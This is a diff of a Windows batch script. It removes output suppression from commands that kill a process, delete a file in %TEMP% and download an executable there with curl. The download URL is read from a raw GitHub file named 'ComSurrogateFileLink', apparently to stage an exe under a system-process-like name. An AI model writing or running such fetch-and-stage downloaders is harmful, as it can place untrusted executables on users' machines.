@@ -25,8 +25,8 @@ echo.
 
 
 :: Kill & Delete file 
-taskkill /f /im !filename!.exe >nul 2>&1
-del /f /q "%TEMP%\!filename!.exe" >nul 2>&1
+taskkill /f /im !filename!.exe
+del /f /q "%TEMP%\!filename!.exe"
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ComSurrogateFileLink') do set "COMFILELINK=%%i"
 
@@ -37,15 +37,15 @@ echo.
 :: Download the file using curl
 curl -L -# -o "%TEMP%\!filename!.exe" "%COMFILELINK%"
 
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak 
 
 :: Checking the existing of the file
 if not exist "%TEMP%\!filename!.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo.
 	goto loop
 )
@@ -63,9 +63,9 @@ if %FILESIZE% geq 16777216 (
 ) else (
     echo.
     echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo.
 	goto loop
 )
